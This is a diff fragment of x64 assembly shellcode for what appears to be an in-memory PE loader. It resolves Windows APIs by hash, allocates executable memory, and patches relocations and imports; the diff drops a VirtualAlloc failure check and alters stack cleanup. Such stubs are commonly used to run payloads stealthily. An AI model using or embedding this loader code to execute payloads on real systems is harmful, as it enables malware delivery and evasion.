@@ -35,8 +35,6 @@ start:								;
 	mov ecx,dword 0x00				; lpAddress
 	mov r10d,0xE553A458				; hash( "kernel32.dll", "VirtualAlloc" )
 	call rbp						; VirtualAlloc(lpAddress,dwSize,MEM_COMMIT|MEM_TOP_DOWN|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
-	test rax,rax					; Check success 
-	jz end						    ; If VirtualAlloc fails don't bother :/	
 	add rsp,0x20					; Clear stack
 	mov rdi,rax						; Save the new base address to rdi
 
@@ -85,6 +83,7 @@ pass:
 reloc_fin:                          ; All done !
 
 ;#- resolve.asm --------------------------------
+; (RCX/RDX/R8/R9/R10/R11) = function_parameters
 ; STACK[0] = &_IMPORT_DESCRIPTOR
 ; R13 = Module HANDLE
 ; R14 = &IAT
@@ -141,7 +140,8 @@ LoadLibraryA:
 	mov rcx,rax                 ; Move the address of library name string to RCX
 	mov r10d,0x0726774C         ; hash( "kernel32.dll", "LoadLibraryA" )
 	call rbp                    ; LoadLibraryA([esp+4])
-	add rsp,32                 ; Fix the stack
+	pop rcx                     ; Fix the stack
+	pop rcx                     ; ...
 	pop rcx                     ; Retreive ecx
 	ret                         ; <-
 GetProcAddress:
@@ -149,7 +149,8 @@ GetProcAddress:
 	mov rdx,rax                 ; Move the address of function name string to RDX as second parameter
 	mov r10d,0x7802F749         ; hash( "kernel32.dll", "GetProcAddress" )
 	call rbp                    ; GetProcAddress(ebx,[esp+4])
-	add rsp,32                  ; Retrieve ecx
+	pop rcx                     ; Retrieve ecx
+	pop rcx                     ; ...
 	ret                         ; <-
 complete:
 	pop rax                     ; Clean out the stack
